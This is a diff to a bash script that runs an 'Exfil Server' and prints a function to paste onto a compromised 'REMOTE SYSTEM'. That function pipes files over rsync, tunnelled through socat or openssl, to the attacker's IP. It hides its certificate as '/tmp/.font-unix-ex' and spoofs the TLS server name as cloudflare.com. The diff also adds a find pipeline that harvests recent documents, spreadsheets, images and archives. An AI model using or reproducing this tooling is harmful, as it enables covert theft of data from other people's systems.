@@ -29,30 +29,36 @@ Cut & paste the following lines into the REMOTE SYSTEM:${CF}
 ${CM}${CF}SF_EXFIL_PEM=\"$(<"$pemfn")\"
 exfil() {
     local fn=\"/tmp/.font-unix-ex\"
-    local concmd
+    local concmd opts
     command -v socat &>/dev/null && {
-        concmd=\"socat - OPENSSL-CONNECT:${rip}:${rport}\"
+        concmd=\"socat - OPENSSL-CONNECT:${RIP:?}:${RPORT:?}\"
         concmd+=\",cert=\$fn,cafile=\$fn,verify=0\"
     }
     command -v openssl &>/dev/null && {
-        concmd=\"openssl s_client -connect ${rip}:${rport}\"
+        concmd=\"openssl s_client -connect ${RIP:?}:${RPORT:?}\"
         concmd+=\" -servername cloudflare.com -cert \$fn\"
         concmd+=\" -CAfile \$fn -quiet\"
     }
-    [[ -z \"\$concmd\" ]] && { echo >&2 \"Need openssl or socat.\"; return; }
+    [ -z \"\$concmd\" ] && { echo >&2 \"Need openssl or socat.\"; return; }
+    [ \$# -eq 0 ] && [ -t 0 ] && { echo >&2 \"exfil <filename>\"; return; }
     echo \"\$SF_EXFIL_PEM\" >\"\$fn\"
-    rsync -ahPR${OPT} --size-only -e \"sh -c 'exec \$concmd' #\" -- \"\$@\" 0:
+    opts=(-ahR${OPT} --partial --info=progress2 --size-only -e \"sh -c 'exec \$concmd' #\")
+    [ \$# -eq 0 ] && opts+=(--files-from - . -0)
+    rsync \"\${opts[@]}\" -- \"\$@\" 0:
     rm -f \"\${fn:?}\"
 }${CN}${CF}
 ########[[ ${CDR}DO NOT CUT & PASTE BEYOND THIS POINT${CN}${CF} ]]##############################
 ${CN}To exfil data from the REMOTE SYSTEM type the following on the REMOTE SYSTEM:
     ${CDC}exfil *.php *.tar.gz   ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)
     ${CDC}exfil /var/www/warez   ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/var/www/warez
-    ${CDC}exfil /var/www/./warez ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/warez
+    ${CDC}exfil /var/www/./warez ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/warez${CN}
+or exfil only files from this year, larger than 1k and of specific extensions:
+    ${CDC}regex='.*\.(pdf|doc|docx|xls|xlsx|zip|xml|jpg|jpeg|png|csv)\$'
+    find . -type f -size +1024c -mtime -364 -regextype egrep -iregex \"\${regex:-.*}\" -print0 | grep -ziv cache | exfil${CN}
 
 ${CN}${CDG}Exfil Server is running.
 Press ${CDM}CTRL-c${CDG} to stop.
 ${CN}"
 
-socat OPENSSL-LISTEN:${rport},reuseaddr,fork,cert="$pemfn",cafile="$pemfn" EXEC:"rsync --server -logtprR${OPT} --safe-links --partial ."
+socat OPENSSL-LISTEN:${RPORT},reuseaddr,fork,cert="$pemfn",cafile="$pemfn" EXEC:"rsync --server -logtprR${OPT} --safe-links --partial ."
 rm -f "${pemfn:?}"
